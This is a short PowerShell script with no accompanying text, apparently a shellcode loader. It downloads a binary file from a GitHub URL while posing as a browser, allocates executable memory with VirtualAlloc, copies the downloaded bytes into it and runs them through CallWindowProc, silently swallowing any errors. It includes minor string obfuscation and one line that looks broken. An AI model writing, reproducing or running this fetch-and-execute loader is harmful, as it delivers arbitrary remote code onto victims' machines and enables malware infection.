$u = "https://github.com/vaerds/cdn/blob/main/nsm.bin"

$k = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-Process -Id $PID).Modules.BaseAddress, [Action]
).Method.Module.Assembly.GetType(
    "Win"+"32"
)

function Get-Slv {
    param($url)
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    return $wc.DownloadData($url)
}

$w32 = @"
using System;
using System.Runtime.InteropServices;
public class W32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("user32")] public static extern bool CallWindowProc(IntPtr p, IntPtr h, uint m, uint w, uint l);
}
"@
Add-Type $w32

try {
    $sc = Get-Slv $u
    $sz = $sc.Length
    
    $ptr = [W32]::VirtualAlloc([IntPtr]::Zero, $sz, 0x3000, 0x40)
    
    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $sz)
    
    [W32]::CallWindowProc($ptr, [IntPtr]::Zero, 0, 0, 0)
} catch { }
